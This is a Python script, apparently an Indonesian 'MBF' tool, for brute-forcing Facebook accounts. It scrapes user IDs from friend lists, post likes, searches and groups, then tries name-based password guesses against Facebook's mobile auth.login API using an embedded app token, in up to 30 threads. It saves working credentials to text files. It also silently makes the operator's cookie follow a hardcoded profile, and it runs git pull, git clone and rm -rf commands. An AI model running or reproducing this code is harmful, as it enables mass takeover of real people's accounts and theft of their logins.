#!/usr/bin/python
# -*- coding: utf-8 
#################################
#        AUTHOR : LIMUNE ( FAIZUL )                #
#        FACEBOOk : LIMUNE.                              #
#        github Lemon223.                                   #
#################################

import os,sys,re,time,json,random,requests
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor

def mulai():
    os.system("git pull")
def lupo_lupo_milzu():
    os.system("clear")
def aink(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./300)

time.sleep(0.1)
print("""
    
   \33[37;1m______          __    ____
  \33[37;1m/ ____/___ ___  / /_  / __/  \33[37;1m( \33[0;32mCloning Multi Brute Force \33[37;1m)
\33[37;1m / /   / __ `__ \/ __ \/ /_  
\33[0;36m/ /___/ / / / / / /_/ / __/  
\33[0;36m\____/_/ /_/ /_/_.___/_/     
                              """)
                              
print("         \033[95m║ \33[0;36mCREATOR - LIMUNE / Faizul \033[95m║")
print(" \033[95m║ \33[37;1mScrip Di lengkapi Api Key \033[95m║")
print(" \033[95m║ \33[37;1mHubunggi Admin Untuk Mendpatkan Api Key Trial \033[95m║")
print(" \033[95m║ \33[37;1mWhatsapp +6282151858918 \033[95m║")

input("\n\033[95m[\033[97m?\033[95m] \033[96mName User\033[97m:\033[92m ")
Password = "Limune/12385udbfjejdjslienddjenuhbdjdudjendj"

loop = 'true'
while (loop == 'true'):
    passcode = input("\033[1;95m[\033[97m?\033[95m] \033[96mApi Key Tools\033[97m:\033[92m ")
    if (passcode == Password):
            loop = 'false'
    else:
            exit("Api Key Invalid Silkan Order Ke Admin")

def fail():
        a=requests.get("http://ip-api.com/json/",headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","userAgent":"Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.39 Mobile Safari/537.36"}).json()
        try:
            ip = a["query"]
        except KeyError:
            ip = " "
        try:
            ng = a["country"]
        except KeyError:
            ng = " "
        try:
            pr = a["regionName"]
        except KeyError:
            pr = " "
        try:
            kt = a["city"]
        except KeyError:
            kt = " "
        try:
            tz = a["timezone"]
        except KeyError:
            tz = " "
        try:
            sp = a["isp"]
        except KeyError:
            sp = " "
        print("\033[95m[\033[96m▪\033[95m]\033[97mIP ANDA\033[96m= " + ip)
        print("\033[95m[\033[96m▪\033[95m]\033[97mNegara \033[96m= " + ng)
        print("\033[95m[\033[96m▪\033[95m]\033[97mProvinsi \033[96m= " + pr)
        print("\033[95m[\033[96m▪\033[95m]\033[97mKota \033[96m= " + kt)
        print("\033[95m[\033[96m▪\033[95m]\033[97mZona Waktu \033[96m= " + tz)
        print("\033[95m[\033[96m▪\033[95m]\033[97mKartu Anda \033[96m= " + sp)
  
def peak():
    time.sleep(0.1)
    print("""
   \33[37;1m__   __  ______  ____
  \33[37;1m/ /  /  |/  / _ )/ __/ \33[37;1m║ \33[37;1mCreator : \33[0;36mLimune / Faizul \33[37;1m║
 \33[37;1m/ /__/ /|_/ / _  / _/   \33[37;1m║ \33[0;36mType Scripter LMBF \33[37;1m║
\33[37;1m/____/_/  /_/____/_/    
 \33[0;32mVersion 3,9,0                       
 """)

def mbfv2():
    time.sleep(0.1)
    print("\33[37;1m[ \33[1;33m01 \33[37;1m] Login Cookies ")
    print("\33[37;1m[ \33[1;33m02 \33[37;1m] Tutorial Mendpatkan Cookies ( Di Arahkan Ke Admin ) ")
    print("\33[37;1m[ \33[1;33m03 \33[37;1m] Comingsoon ")
    print("\33[37;1m[ \33[1;33m04 \33[37;1m] Comingsoon ")
    print("\33[37;1m[ \33[1;33m05 \33[37;1m] Install Scrip Mbf-v2 ")
    print("\33[37;1m[ \33[1;33m00 \33[37;1m] Exit ( Keluar )")
    time.sleep(0.1)

    
    uwu=input("( Choose ) : ")
    if uwu == "1" or uwu =="01":
         mbasic = 'https://mbasic.facebook.com{}'
         global die,check,result, count
         id = []
         die = 0
         chek = []
         hack = []
         count = 0
         check = 0
         result = 0
         def masuk():
             try:
                    cek = open("cookies").read()
             except FileNotFoundError:
                   lupo_lupo_milzu()
                   fail()
                   peak()
                   cek = input("\033[0;95m ║═════════════════════════════════╗ \n \033[95m║\033[95m[ \033[92mTekan open untuk membuka Cokies \033[0;90m]\033[95m║ \n \033[95m╚═════════════════════════════════╝ \n \033[95m╔═════════════════════════════════╗\n \033[95m║[\033[96m>_<\033[95m] \033[92mCokiee \033[1;96m~>\033[92m                  \033[95m║\n \033[95m╚═════════════════════════════════╝ \033[1;97m")
                   print('\n\033[95m [\033[97m*\033[95m] \033[96mLoading...\033[92m.\033[95m.\033[92m.');time.sleep(2)
             cek = {"cookie":cek}
             ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
             if "mbasic_logout_button" in str(ismi):
                     if "Apa yang Anda pikirkan sekarang" in str(ismi):
                             with open("cookies","w") as f:
                                     f.write(cek["cookie"])
                     else:
                           print("\033[1;95m[\033[1;92m+\033[1;96m] \033[96mUbah bahasa, harap tunggu\033[1;97m!!\033[00m")
                           try:
                                  requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)
                           except:
                                  pass
                     try:
                             ikuti = parser(requests.get(mbasic.format("/100062162973277"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
                             ses.get(mbasic.format(ikuti),cookies=cek)
                     except :
                             pass
                     return cek["cookie"]
                     aink('\033[1;95m[\033[1;97m+\033[1;95m] \033[1;92mLogin berhasil...')
             else:
                  os.system("xdg-open https://www.facebook.com/Anak.haram2021") 
                  os.system('rm -rf cookies')
                  
                  print(" \n \033[95m[\033[96m!\033[95m]  \033[93mCookie Salah\033[91m°\033[92m~\033[91m°")
                  os.system('python Limune.py')
         def login(username,password,cek=False):
             global die,check,result,count
             b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
             params = {
                     'access_token': b,
                     'format': 'JSON',
                     'sdk_version': '2',
                     'email': username,
                     'locale': 'en_US',
                     'password': password,
                     'sdk': 'ios',
                     'generate_session_cookies': '1',
                     'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
             }
             api = 'https://b-api.facebook.com/method/auth.login'
             response = requests.get(api, params=params)
             if 'EAA' in response.text:
                 print(f"\r\033[1;92m  * \033[90m[\033[92mLive\033[90m]👉\033[92m {username}[-]{password}                       ",end="")
                 print()
                 result += 1
                 if cek:
                        life.append(username+"[-]"+password)
                 else:
                        with open('now.txt','a') as f:
                                f.write(username + '[-]' + password + '\n')
             elif 'www.facebook.com' in response.json()['error_msg']:
                   print(f"\r\033[1;93m  * \033[90m[\033[93mLimune\033[90m]👉\033[93m {username}\033[90m[\033[93m+\033[90m]\033[93m{password}                    ",end="")
                   print()
                   check += 1
                   if cek:
                           chek.append(username+"[+]"+password)
                   else:
                           with open('cp.txt','a') as f:
                                f.write(username + '[+]' + password + '\n')
             else:
                   die += 1
             for i in list('+×'):
                            print(f"\r\033[00m [\033[1;91m{i}\033[00m] \033[96mProses : \033[90m[\033[1;94m{str(die)}\033[90m] \033[93mLimune \033[91m: \033[90m[\033[1;93m{str(check)}\033[90m] \033[92mLive \033[91m: \033[90m[\033[1;92m{str(result)}\033[90m]\033[00m",end="")
                            time.sleep(0.2)
         def getid(url):
             raw = requests.get(url,cookies=kuki).content
             getuser = re.findall('middle"><a class=".." href="(.*?)">(.*?)</a>',str(raw))
             for x in getuser:
                 if 'profile' in x[0]:
                        id.append(x[1] + '|' + re.findall("=(\d*)?",str(x[0]))[0])
                 elif 'friends' in x:
                        continue
                 else:
                        id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])
                 print('\r\033[1;95m [\033[1;92m+\033[1;95m] \033[1;96m' + str(len(id)) + " \033[1;97mProsesing Dump ID... ",end="")
             if 'Lihat Teman Lain' in str(raw):
                 getid(mbasic.format(parser(raw,'html.parser').find('a',string='Lihat Teman Lain')['href']))
             return id
         def fromlikes(url):
             try:
                  like = requests.get(url,cookies=kuki).content
                  love = re.findall('href="(/ufi.*?)"',str(like))[0]
                  aws = getlike(mbasic.format(love))
                  return aws
             except:
                  exit(" \033[1;95m [\033[1;92m•\033[1;95m] \033[97m DataBase Anda Berhasil Di Input")
         def getlike(react):
             like = requests.get(react,cookies=kuki).content
             ids  = re.findall('class="b."><a href="(.*?)">(.*?)</a></h3>',str(like))
             for user in ids:
                 if 'profile' in user[0]:
                         id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                 else:
                         id.append(user[1] + "|" + user[0].split('/')[1])
                 print(f'\r\033[1;95m [\033[1;92m•\033[1;95m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ',end="")
             if 'Lihat Selengkapnya' in str(like):
                 getlike(mbasic.format(parser(like,'html.parser').find('a',string="Lihat Selengkapnya")["href"]))
             return id
         def bysearch(option):
             search = requests.get(option,cookies=kuki).content
             users = re.findall('class="x ch"><a href="/(.*?)"><div.*?class="cj">(.*?)</div>',str(search))
             for user in users:
                  if "profile" in user[0]:
                         id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                  else:
                         id.append(user[1] + "|" + user[0].split("?")[0])
                  print(f"\r \033[1;96m{str(len(id))} \033[1;97mSEARCH ID... ",end="")
             if "Lihat Hasil Selanjutnya" in str(search):
                  bysearch(parser(search,'html.parser').find("a",string="Lihat Hasil Selanjutnya")["href"])
             return id
         def grubid(endpoint):
             grab = requests.get(endpoint,cookies=kuki).content
             users = re.findall('a class=".." href="/(.*?)">(.*?)</a>',str(grab))
             for user in users:
                 if "profile" in user[0]:
                         id.append(user[1] + "|" + re.findall('id=(\d*)',str(user[0]))[0])
                 else:
                         id.append(user[1] + "|" + user[0])
                 print(f"\r\033[1;95m [\033[1;92m+\033[1;95m] \033[1;96m{str(len(id))} \033[1;97mProsesing Dump ID... ",end="")
             if "Lihat Selengkapnya" in str(grab):
                 grubid(mbasic.format(parser(grab,"html.parser").find("a",string="Lihat Selengkapnya")["href"]))
             return id
         if __name__ == '__main__':
               try:
                   ses = requests.Session()
                   kukis = masuk()
                   kuki = {'cookie':kukis}
                   lupo_lupo_milzu()
                   fail()
                   peak()
                   aink("[ Metode Tracking Tools Limune ] ")
                   
                   aink("\33[37;1m[ \33[1;33m01 \33[37;1m] Crack Daftar Teman ")
                   aink("\33[37;1m[ \33[1;33m02 \33[37;1m] Crack Dari Like Post ")                   
                   aink("\33[37;1m[ \33[1;33m03 \33[37;1m] Crack Dari Search Name ")                   
                   aink("\33[37;1m[ \33[1;33m04 \33[37;1m] Crack Dari Grub \33[37;1m( \33[31;1mCoomingsoon \33[37;1m) ")                   
                   aink("\33[37;1m[ \33[1;33m05 \33[37;1m] Crack Dari Publik ")           
                   aink("\33[37;1m[ \33[1;33m06 \33[37;1m] Cek Hasil Crack ")                   
                   aink("\33[37;1m[ \33[1;33m07 \33[37;1m] Delet Cookies ")                
                   aink("\33[37;1m[ \33[1;33m00 \33[37;1m] Exit Tools ")                   
                   
                   doge=input(" [ Choise ]")
                   if doge =="":
                         print("\n\n\033[95m [\033[91m!\033[95m] \033[96mHarus dipilih!")
                         uwutc()
                   elif doge == '0' or doge =='00':
                         aink("\n\033[1;92m Terima kasih sudah menggunakan server.\n  Dan kamu harus bantu folow facebook Limune...\n\n")
                         os.system('xdgu-open  https://www.facebook.com/Anak.haram2021')
                         exit()                   	
                   elif doge == '7' or doge =='07':
                         print("\n\x1b[1;95m [\x1b[1;96m*\x1b[1;95m] \x1b[1;96mHarap bersabar... ")
                         aink("\x1b[1;91m ▪ 10")
                         aink("\x1b[1;91m ▪▪ 20")
                         aink("\x1b[1;91m ▪▪▪ 30")
                         aink("\x1b[1;91m ▪▪▪▪ 40")
                         aink("\x1b[1;93m ▪▪▪▪▪ 50")
                         aink("\x1b[1;93m ▪▪▪▪▪▪ 60")
                         aink("\x1b[1;93m ▪▪▪▪▪▪▪ 70")
                         aink("\x1b[1;93m ▪▪▪▪▪▪▪▪ 80")
                         aink("\x1b[1;92m ▪▪▪▪▪▪▪▪▪ 90")
                         aink("\x1b[1;92m ▪▪▪▪▪▪▪▪▪▪ 100%")
                         os.system("rm -rf cookies")
                         print("\n\x1b[1;95m [\x1b[1;92m+\x1b[1;95m]\x1b[1;93m Menghapus Cokiees Selesai!")
                         mbfv2()
                   elif doge == '1' or doge =='01':
                         url = parser(ses.get(mbasic.format('/me'),cookies=kuki).content,'html.parser').find('a',string='Teman')
                         username = getid(mbasic.format(url["href"]))
                   elif doge == '2' or doge =='02':
                         username = input("\033[1;95m\n [\033[1;97m?\033[1;96m] \033[96mMasukin Link post \033[1;92m: \033[1;93m")
                         if username == "":
                                 exit("\033[95m[\033[92m!\033[95m] \033[91mLink post tidak ditemukan!")
                         elif 'www.facebook' in username:
                                 username = username.replace('www.facebook','mbasic.facebook')
                         elif 'www.facebook' in username:
                                 username = username.replace('m.facebook','mbasic.facebook.com')
                         username = fromlikes(username)
                   elif doge == '3' or doge =='03':
                         lol = input("\n lookat: ")
                         username = bysearch(mbasic.format('/search/people/?q='+lol))
                         if len(username) == 0:
                                 exit("! Nama tidak ditemukan!")
                   elif doge == '4' or doge =='04':
                         print("\033[1;95m\n [\033[1;92m▪▪\033[1;95m] \033[1;96mHarap di isi \033[91m100 \033[00mID Grup ")
                         grab = input("\033[1;95m[\033[1;96m?\033[1;96m] \033[96mMasukin ID Grup \033[1;92m: \033[1;92m")
                         username = grubid(mbasic.format("/browse/group/members/?id=" + grab))
                         if len(username) == 0:
                                 exit("\033[95m[\033[92m!\033[95m] \033[96mGRUP ID TIDAK DITEMUKAN!")
                   elif doge == '5' or doge =='05':
                         knf = input("\033[1;95m\n [\033[1;96m?\033[1;95m] \033[96mUSERNAME/ID PUBLIK\033[1;97m: \033[1;92m")
                         if knf.isdigit():
                                 user = "/profile.php?id=" + knf
                         else:
                                 user = "/" + knf
                         try:
                                 user = parser(requests.get(mbasic.format(user),cookies=kuki).content,"html.parser").find('a',string="Teman")["href"]
                                 username = getid(mbasic.format(user))
                         except TypeError:
                                 exit("\033[95m[\033[92m!\033[95m] \033[96mPENGGUNA TIDAK DITEMUKAN!")
                   elif doge == '6' or doge =='06':
                         try:
                                 file1 = open("cp.txt").read()
                                 file2 = open("now.txt").read()
                                 a = file1 + file2
                                 final = a.strip().split("\n")
                                 final = set(final)
                                 print(f"\033[95m\n [\033[92m{str(len(final))}\033[96m] User sedang di check ")
                                 with ThreadPoolExecutor(max_workers=10) as ex:
                                         for user in final:
                                                 a = user.split("|")
                                                 ex.submit(login,(a[0]),(a[1]),(True))
                                 for x in result:
                                         with open('now.txt','a') as f:
                                                 f.write(x+'\n')
                                 for x in chek:
                                         with open('cp.txt','a') as f:
                                                 f.write(x+"\n")

                                 print("\n\x1b[1;95m[\x1b[1;92m•\x1b[1;95m] \033[1;96mSelesai...")
                                 print("\x1b[1;95m[\x1b[1;92m✓\x1b[1;95m] \033[1;92mDi Save Di \033[1;93mcp.txt\033[96m|\033[1;92mok.txt")
                         except FileNotFoundError:
                                 exit("\n\033[95m[\033[91m!\033[95m] \033[1;96mKamu tidak mendapatkan hasil")
                   else:
                         print("\n\n \033[95m[\033[91m😣\033[95m] \033[1;93mHarus dipillih!")
                         uwu()
                   print()
                   lupo_lupo_milzu()
                   fail()
                   peak()
                   print('\033[95m\033[92mJUMLAH ID FB\x1b[1;91m :\x1b[1;92m ' + str(len(id)) + "\n\x1b[1;95m \n",end="")       
                   expass = input("\n\033[1;93m [\033[1;96m?\033[1;93m] + Password1 \033[1;91m: \033[1;92m")
                   expass = input("\033[1;92m [\033[1;96m?\033[1;92m] + Password2 \033[1;91m: \033[1;92m")
                   aink('\x1b[1;95m────────────────────────────────────────────────────\n')
                   lupo_lupo_milzu()
                   fail()
                   peak()
                   print('\033[96mSemua ID\x1b[1;91m :\033[96m ' + str(len(id)) + "\n\033[92m \n",end="")
                   print('\n\033[95m [\033[1;92m+\033[95m] \033[96mhasil\033[92m Live\033[93m disimpan di \033[91m: \033[92mLive.txt\n \033[92m[\033[93m-\033[92m] \033[96mhasil\x1b[1;93m Cp\033[92m disimpan di \033[91m: \033[92mcp.txt')
                   print('\n [\x1b[1;91m▪\x1b[1;95m] \033[92mMatikan data seluler untuk menjeda proses crack\n')
                   with ThreadPoolExecutor(max_workers=30) as ex:
                          for user in username:
                                  users = user.split('|')
                                  ss = users[0].split(' ')
                                  for x in ss:
                                          listpass = [
                                                  str(x) + '1',
                                                   str(x) + '12',
                                                    str(x) + '123',
                                                     str(x) + '1234',
                                                     str(x) + '12345',
                                                     str(x) + '123456',
                                                          'sayang',
                                                           'kontol',
                                                           'anjing',
                                                  ]
                                          listpass.append(expass)
                                          for passw in set(listpass):
                                                  ex.submit(login,(users[1]),(passw))
                   if check != 0 or result != 0:
                           time.sleep(0.1)
                           print("\n\n\x1b[1;92m  *\033[96m Selesai...")
     
                   else:
                           print("\n\n\x1b[1;96m  *\033[91m kamu tidak memiliki hasil apapun:(")
               except (KeyboardInterrupt,EOFError):
                       exit()
               except requests.exceptions.ConnectionError:
                       exit("\n\n\033[00m  [\033[91m!\033[00m] Putus Koneksi")

    elif uwu == "2" or uwu =="02":
         os.system("xdg-open https://www.facebook.com/Anak.haram2021")
         mbfv2()
    elif uwu == "3" or uwu =="03":
         os.system('clear')
         mbfv2()
    elif uwu == "4" or uwu =="04":
         os.system('clear')
         mbfv2()
    elif uwu == "5" or uwu =="05":
         print("\n\n\x1b[1;97m      [ \x1b[1;92m[▪] Tunggu sebentar... \x1b[1;97m ]\n")
         print("\033[93m [~] PROSES SEDANG BERJALAN ")
         os.system("git pull")
         os.system("apt install python")
         os.system("apt install python2")
         os.system("apt install git")
         os.system("apt install php")
         os.system("pip install mechanize")
         os.system("pip install requests")
         os.system("pip install bs4")
         os.system("pip install python")
         os.system("python -m pip install -r Vmbf-2/requirements.txt")
         os.system("git clone https://github.com/Lemon223/Vmbf-2")
         os.system("unzip AdminIT.zip")
         os.system("cd Vmbf-2")         
         os.system("python run.py")
         print("\n \x1b[1;95m[\x1b[1;92m+\x1b[1;95m]\x1b[1;93m Info update tanggal 30 maret 2022.!!\n ")
         mbfv2()
    elif uwu == "0" or uwu =="00":
         aink("\n\033[1;92m Terima kasih sudah menggunakan tools ini.\n  Dan jangan lupa follow facebook saya\n\n")
         os.system("xdg-open https://www.facebook.com/Anak.haram2021")
         aink("\033[93m [▪] BYE...")
         exit()

if __name__=="__main__":
     lupo_lupo_milzu()
     mulai()
     lupo_lupo_milzu()
     fail()
     peak()
     mbfv2()